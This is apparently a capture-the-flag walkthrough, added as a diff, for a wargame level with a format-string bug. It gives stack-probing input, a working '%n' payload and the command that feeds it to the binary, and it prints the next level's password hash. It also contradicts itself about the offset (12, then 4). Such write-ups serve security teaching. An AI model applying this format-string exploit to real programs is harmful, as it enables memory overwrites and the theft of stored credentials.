@@ -1,0 +1,19 @@
+- This level is similar to the previous level. just this level we the call to the system function it will be with this arg ("/bin/cat /home/user/level5/.pass")
+
+- This time the comparison it's with the value '0x1025544' = 16930116, and we know that we can't use padding more than 512 cuz the fget buffer is just 512.
+
+- The offset this time is 12:
+
+$> ./level4
+AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p
+AAAA 0xb7ff26b0 0xbffff764 0xb7fd0ff4 (nil) (nil) 0xbffff728 0x804848d 0xbffff520 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520
+
+- So the offset is 4, Now we need to make the payload for exploiting.
+
+$> python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' > /tmp/payload
+$> cat /tmp/payload - | ./level4
+[...]
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+
+
+# We can use "%16930112d" or "%16930112x"
